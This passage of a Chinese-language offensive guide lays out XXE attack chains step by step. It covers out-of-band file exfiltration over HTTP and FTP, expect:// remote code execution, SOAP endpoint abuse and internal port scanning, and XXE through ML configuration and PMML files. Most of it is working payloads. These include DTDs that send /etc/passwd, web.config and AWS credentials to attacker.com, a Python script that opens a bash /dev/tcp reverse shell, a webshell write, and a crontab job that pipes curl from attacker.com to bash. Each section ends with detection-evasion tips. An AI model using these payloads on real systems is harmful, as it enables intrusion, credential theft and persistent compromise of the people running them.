%exfil;
EOF

# 启动 HTTP 服务器托管 DTD
cd /data/user/work && python3 -m http.server 8080
```

**步骤 3：发送 Blind XXE payload 触发外带**

```bash
# 发送引用外部 DTD 的 XXE payload
curl -i -X POST http://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com:8080/evil.dtd">
  %dtd;
]>
<root><data>&send;</data></root>'

# 利用流程:
# 1. 目标解析 XML，遇到 %dtd; → 从 attacker.com 下载 evil.dtd
# 2. evil.dtd 定义 %file; 读取 /etc/passwd
# 3. evil.dtd 定义 %exfil; 构造 %send; 实体，URL 包含 %file; 内容
# 4. 目标解析 &send; → 向 attacker.com 发送 HTTP 请求，参数 data=文件内容
# 5. 攻击者 HTTP 服务器日志记录文件内容

# 攻击者侧日志:
# GET /?data=root:x:0:0:root:/root:/bin/bash... HTTP/1.1
```

**步骤 4：处理多行文件（base64 编码 + HTTP 外带）**

```bash
# /etc/passwd 包含换行符，直接外带会破坏 HTTP 请求
# 使用 php://filter base64 编码（PHP 环境）

cat > /data/user/work/evil_base64.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com:8080/?b64=%file;'>">
%exfil;
EOF

curl -i -X POST http://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com:8080/evil_base64.dtd">
  %dtd;
]>
<root><data>&send;</data></root>'

# 攻击者侧解码 base64
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA==" | base64 -d
# 输出: root:x:0:0:root:/root:/bin/bash
```

**步骤 5：FTP 外带（适用于长文件，HTTP URL 长度受限）**

```bash
# FTP 协议逐行发送数据，适合多行文件外带

cat > /data/user/work/evil_ftp.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com:2121/%file;'>">
%exfil;
EOF

# 启动恶意 FTP 服务器（使用 xxeserv）
# 安装: go install github.com/tomnomnom/xxeserv@latest
xxeserv -p 2121 -wp 8080  # FTP 2121 + HTTP 8080（托管 DTD）

curl -i -X POST http://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com:8080/evil_ftp.dtd">
  %dtd;
]>
<root><data>&send;</data></root>'

# FTP 服务器日志逐行记录文件内容
```

**步骤 6：Error-Based XXE（HTTP/FTP 均被阻止时）**

```bash
# 若出站 HTTP/FTP 被阻止，利用错误消息泄露数据

cat > /data/user/work/evil_error.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
EOF

curl -i -X POST http://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com:8080/evil_error.dtd">
  %dtd;
]>
<root><data>test</data></root>'

# 解析器尝试打开 file:///nonexistent/<hostname内容>
# 错误消息: "Failed to load file: /nonexistent/target-server-hostname"
# hostname 内容泄露在错误消息中
```

**检测规避要点**：
- 外部 DTD 两跳加载绕过浅层 WAF 检测
- base64 编码避免换行符破坏 HTTP 请求
- FTP 外带适合多行文件（逐行发送）
- Error-Based 不需要出站连接，只需错误消息回显

---

### 攻击链 3：XXE 至 RCE（PHP expect:// wrapper）

**场景**：目标使用 PHP + libxml2 解析 XML，且安装了 PHP expect 扩展。expect:// 协议允许通过 XML 实体直接执行系统命令。

**CVE 参考**：CWE-611 + PHP expect 协议滥用，2026 年仍在旧版 PHP 应用中出现。

**步骤 1：确认 PHP 环境和 expect 扩展**

```bash
# 探测目标是否为 PHP 后端
curl -i http://target.com/
# 响应头 Set-Cookie: PHPSESSID=... → PHP 确认

# 测试 php://filter 协议是否可用（确认 PHP 环境支持协议包装器）
curl -i -X POST http://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>'

# 若返回 base64 编码的 /etc/passwd → PHP 协议包装器可用
```

**步骤 2：通过 expect:// 执行命令**

```bash
# expect:// 协议直接执行系统命令
# 语法: expect://command
curl -i -X POST http://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root><data>&xxe;</data></root>'

# 若 expect 扩展已安装，响应包含命令输出:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**步骤 3：自动化 RCE 利用脚本**

```python
# xxe_expect_rce.py - XXE + expect:// 自动化 RCE
import requests

TARGET = "http://target.com/api/process"

def xxe_rce(command):
    """
    通过 XXE + expect:// 执行系统命令
    command: 要执行的 shell 命令
    """
    # URL 编码命令中的特殊字符
    # expect:// 协议将命令传给 /usr/bin/expect 执行
    payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://{command}">]>
<root><data>&xxe;</data></root>'''
    
    r = requests.post(TARGET, data=payload, headers={"Content-Type": "application/xml"})
    return r.text

# 执行命令
print("[*] whoami:", xxe_rce("whoami"))
print("[*] id:", xxe_rce("id"))
print("[*] uname -a:", xxe_rce("uname -a"))

# 读取 /etc/passwd
print("[*] /etc/passwd:")
print(xxe_rce("cat /etc/passwd"))

# 读取数据库配置
print("[*] DB config:")
print(xxe_rce("cat /var/www/html/config.php"))

# 获取反弹 shell
reverse_shell = "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
print("[*] Sending reverse shell...")
xxe_rce(reverse_shell)
```

**步骤 4：expect:// 不可用时的替代 RCE 路径**

```bash
# 若 expect 扩展未安装，尝试其他 RCE 路径

# 路径 1: XXE + XSLT RCE（若目标支持 XSLT）
curl -i -X POST http://target.com/api/transform \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function(\'system\',\'id\')"/>
  </xsl:template>
</xsl:stylesheet>'

# 路径 2: XXE 读取 PHP 源码 → 发现其他漏洞
# 通过 php://filter 读取源码（base64 编码）
curl -i -X POST http://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]>
<root><data>&xxe;</data></root>'
# 解码 base64 获取 PHP 源码，寻找 SQL 注入、文件上传等漏洞

# 路径 3: XXE 写文件（PHP + 特定条件）
# 某些 PHP XML 解析器支持 file:// 写入
# 写入 webshell: <?php system($_GET['c']);?>
# 需要特定配置，通常不可行
```

**步骤 5：后渗透 - 持久化**

```bash
# 通过 expect:// 写入 webshell
xxe_rce("echo '<?php system(\\$_GET[\"c\"]);?>' > /var/www/html/.shell.php")

# 验证 webshell
curl "http://target.com/.shell.php?c=id"

# 写入 crontab 持久化
xxe_rce("(crontab -l;echo '*/5 * * * * curl http://attacker.com/sh.sh|bash')|crontab -")
```

**检测规避要点**：
- expect:// 不经过 shell，直接通过 expect 程序执行
- php://filter base64 编码避免特殊字符破坏 XML
- XSLT RCE 是 expect 不可用时的替代路径
- 读取源码寻找其他漏洞是 RCE 失败后的有效策略

---

### 攻击链 4：SOAP API 中的 XXE（参数实体）

**场景**：目标暴露 SOAP Web 服务端点，接受 XML 格式的 SOAP 请求。利用参数实体（`%entity;`）绕过部分解析器对普通实体（`&entity;`）的限制。

**步骤 1：发现 SOAP 端点**

```bash
# 常见 SOAP 端点路径
for path in /soap /wsdl /api/soap /services /axis2 /cxf /WebService.asmx; do
  echo "Testing: $path"
  curl -s -i "http://target.com$path" | head -5
done

# 测试 WSDL（Web Services Description Language）
curl -s "http://target.com/WebService.asmx?WSDL" | head -50
# WSDL 描述了所有可用的 SOAP 操作和参数

# 发送基础 SOAP 请求确认端点
curl -i -X POST http://target.com/WebService.asmx \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: http://tempuri.org/HelloWorld" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
               xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <HelloWorld xmlns="http://tempuri.org/" />
  </soap:Body>
</soap:Envelope>'
```

**步骤 2：SOAP XXE 基础测试**

```bash
# 在 SOAP Body 中注入 XXE
curl -i -X POST http://target.com/WebService.asmx \
  -H "Content-Type: text/xml; charset=utf-8" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
               xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <HelloWorld xmlns="http://tempuri.org/">
      <name>&xxe;</name>
    </HelloWorld>
  </soap:Body>
</soap:Envelope>'

# 若响应包含 /etc/passwd 内容 → SOAP XXE 确认
```

**步骤 3：参数实体绕过（普通实体被过滤）**

```bash
# 某些 SOAP 框架过滤 &entity; 但允许 %entity;（参数实体）
# 参数实体只能在 DTD 内部使用，但可触发外部请求

# 利用参数实体触发 OOB（Blind XXE）
curl -i -X POST http://target.com/WebService.asmx \
  -H "Content-Type: text/xml; charset=utf-8" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com:8080/soap_test">
  %xxe;
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <HelloWorld xmlns="http://tempuri.org/" />
  </soap:Body>
</soap:Envelope>'

# 参数实体 %xxe; 在 DTD 中展开 → 触发 HTTP 请求到 attacker.com
# 攻击者侧收到请求 → Blind XXE 确认（即使响应不回显）
```

**步骤 4：SOAP XXE + OOB 数据外带**

```bash
# 攻击者侧 DTD（同攻击链 2）
cat > /data/user/work/soap_evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///c:/inetpub/wwwroot/web.config">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com:8080/?d=%file;'>">
%exfil;
EOF

cd /data/user/work && python3 -m http.server 8080

# SOAP 请求引用外部 DTD
curl -i -X POST http://target.com/WebService.asmx \
  -H "Content-Type: text/xml; charset=utf-8" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com:8080/soap_evil.dtd">
  %dtd;
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <HelloWorld xmlns="http://tempuri.org/">
      <name>&send;</name>
    </HelloWorld>
  </soap:Body>
</soap:Envelope>'

# 攻击者侧日志: GET /?d=<configuration>...web.config内容...
```

**步骤 5：利用 SOAP 读取 Windows 敏感文件**

```bash
# 读取 web.config（含数据库连接字符串）
curl -i -X POST http://target.com/WebService.asmx \
  -H "Content-Type: text/xml; charset=utf-8" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <HelloWorld xmlns="http://tempuri.org/"><name>&xxe;</name></HelloWorld>
  </soap:Body>
</soap:Envelope>'

# 读取 Machine.config（.NET 全局配置）
# file:///c:/windows/microsoft.net/framework/v4.0.30319/config/machine.config

# 读取 Windows hosts 文件
# file:///c:/windows/system32/drivers/etc/hosts
```

**步骤 6：SOAP XXE 链式利用至内网穿透**

```bash
# SOAP XXE 作为 SSRF 跳板访问内网服务
# 读取内网 HTTP 服务

# 访问内网管理面板
curl -i -X POST http://target.com/WebService.asmx \
  -H "Content-Type: text/xml; charset=utf-8" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.100:8080/admin">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <HelloWorld xmlns="http://tempuri.org/"><name>&xxe;</name></HelloWorld>
  </soap:Body>
</soap:Envelope>'

# 端口扫描内网
for port in 22 80 443 3306 6379 8080 9200; do
  curl -i -X POST http://target.com/WebService.asmx \
    -H "Content-Type: text/xml; charset=utf-8" \
    -d "<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://192.168.1.100:$port\">]>
<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">
  <soap:Body><HelloWorld xmlns=\"http://tempuri.org/\"><name>&xxe;</name></HelloWorld></soap:Body>
</soap:Envelope>"
  echo "Port $port tested"
done
```

**检测规避要点**：
- SOAP 请求天然是 XML，WAF 可能不深度检查 SOAP Body
- 参数实体 `%entity;` 绕过对普通实体 `&entity;` 的过滤
- 利用 SOAP 端点作为 SSRF 跳板访问内网
- Windows 路径用 `file:///c:/path` 格式

---

### 攻击链 5：2026 新向量 - AI/ML 配置文件中的 XXE（YAML 被解析为 XML）

**场景**：2026 年 AI/ML 工程中，配置文件格式混乱。某些 ML 框架的配置加载器在解析 YAML 时会回退到 XML 解析器，或同时支持多种格式。攻击者通过上传恶意配置文件触发 XXE。

**CVE 参考**：2026 年新兴攻击面，相关 CVE 包括 ML 配置解析器漏洞（如 CVE-2026-XXXX 系列）。

**步骤 1：识别 ML 配置文件上传点**

```bash
# ML 模型训练平台通常接受配置文件上传
# 常见端点:
# /api/model/upload-config
# /api/training/config
# /api/pipeline/import
# /api/experiment/create

# 测试配置文件上传
curl -i -X POST http://target.com/api/model/upload-config \
  -F "config=@config.yaml"

# 观察响应，确认配置文件被解析
```

**步骤 2：构造恶意 YAML 配置（包含 XML 注入）**

```bash
# 某些 ML 框架的配置加载器逻辑:
# 1. 尝试解析为 YAML
# 2. 若 YAML 解析失败，尝试 XML 解析
# 3. 若 XML 解析包含实体定义，可能触发 XXE

# 构造"看起来像 YAML 但触发 XML 解析"的文件
cat > /data/user/work/malicious_config.yaml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
# YAML 配置（注释形式）
model:
  name: "test_model"
  version: "1.0"
  # 以下字段可能被 XML 解析器处理
  description: "&xxe;"
  parameters:
    learning_rate: 0.001
    epochs: 100
EOF

# 上传恶意配置
curl -i -X POST http://target.com/api/model/upload-config \
  -F "config=@/data/user/work/malicious_config.yaml"
```

**步骤 3：利用 ML 框架的 XML 回退解析**

```python
# ml_config_xxe.py - ML 配置文件 XXE 自动化探测
import requests

TARGET = "http://target.com/api/model/upload-config"

def test_xxe_in_config(file_content, filename="config.yaml"):
    """
    上传配置文件并检测 XXE
    某些框架会尝试多种解析器，XML 解析器可能处理实体
    """
    files = {"config": (filename, file_content, "text/plain")}
    r = requests.post(TARGET, files=files)
    return r.text

# 测试 1: 标准 XML 声明 + YAML 内容（混合格式）
hybrid_config = '''<?xml version="1.0"?>
<!DOCTYPE config [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
model:
  description: "&xxe;"
'''
result = test_xxe_in_config(hybrid_config)
if "root:" in result:
    print("[+] XXE 确认! /etc/passwd 内容泄露")

# 测试 2: 纯 XML 伪装为 YAML
xml_config = '''<?xml version="1.0"?>
<!DOCTYPE config [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>
<config>
  <model_name>&xxe;</model_name>
</config>
'''
result = test_xxe_in_config(xml_config, "config.xml")
if "AWS_" in result or "PATH=" in result:
    print("[+] 环境变量泄露! 可能包含云凭证")

# 测试 3: OOB XXE（若直接读取不回显）
oob_config = '''<?xml version="1.0"?>
<!DOCTYPE config [
  <!ENTITY % dtd SYSTEM "http://attacker.com:8080/evil.dtd">
  %dtd;
]>
<config>
  <model_name>&send;</model_name>
</config>
'''
test_xxe_in_config(oob_config)
# 检查攻击者 HTTP 服务器是否收到请求
```

**步骤 4：利用 ML Pipeline 的数据外带**

```bash
# ML 训练 pipeline 通常有日志输出功能
# 构造配置文件，将读取的数据写入训练日志

cat > /data/user/work/exfil_config.yaml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE config [
  <!ENTITY xxe SYSTEM "file:///home/mluser/.aws/credentials">
]>
<config>
  <model>
    <name>training_run_&xxe;</name>
    <!-- 训练日志会记录 model name，从而泄露 AWS 凭证 -->
    <output_dir>/shared/logs/</output_dir>
  </model>
</config>
EOF

# 上传后，查看训练日志
curl "http://target.com/api/training/logs?run_id=latest"
# 日志中可能包含: "Starting training_run_[default]\naws_access_key_id = AKIA..."
```

**步骤 5：利用 ML 模型序列化文件中的 XXE**

```bash
# 某些 ML 模型格式（如 PMML - Predictive Model Markup Language）是 XML
# 上传恶意 PMML 模型文件触发 XXE

cat > /data/user/work/malicious_model.pmml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE PMML [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
  <!ENTITY % dtd SYSTEM "http://attacker.com:8080/evil.dtd">
  %dtd;
]>
<PMML xmlns="http://www.dmg.org/PMML-4_4" version="4.4">
  <Header copyright="attacker">
    <Application name="&xxe;" version="1.0"/>
  </Header>
  <DataDictionary numberOfFields="1">
    <DataField name="&send;" optype="continuous" dataType="double"/>
  </DataDictionary>
</PMML>
EOF

# 上传恶意 PMML 模型
curl -i -X POST http://target.com/api/model/import \
  -F "model=@/data/user/work/malicious_model.pmml"
```

**步骤 6：读取 ML 平台敏感配置**

```bash
# 读取 MLflow 配置（含数据库凭证）
xxe_read "file:///opt/mlflow/mlflow.db"

# 读取 Kubeflow 配置
xxe_read "file:///etc/kubeflow/config.yaml"

# 读取 Jupyter 配置（含 token）
xxe_read "file:///home/jovyan/.jupyter/jupyter_notebook_config.json"

# 读取 Docker 环境变量（容器化 ML 训练）
xxe_read "file:///proc/1/environ"
# 可能包含: MLFLOW_TRACKING_URI, AWS_SECRET_ACCESS_KEY, DB_PASSWORD 等
```

**检测规避要点**：
- ML 配置文件格式混乱（YAML/XML/JSON 混合），解析器回退是常见漏洞
- PMML 等模型格式本身是 XML，天然 XXE 攻击面
- 利用训练日志外带数据，不需直接回显
- `/proc/1/environ` 是容器化环境中凭证泄露的关键文件
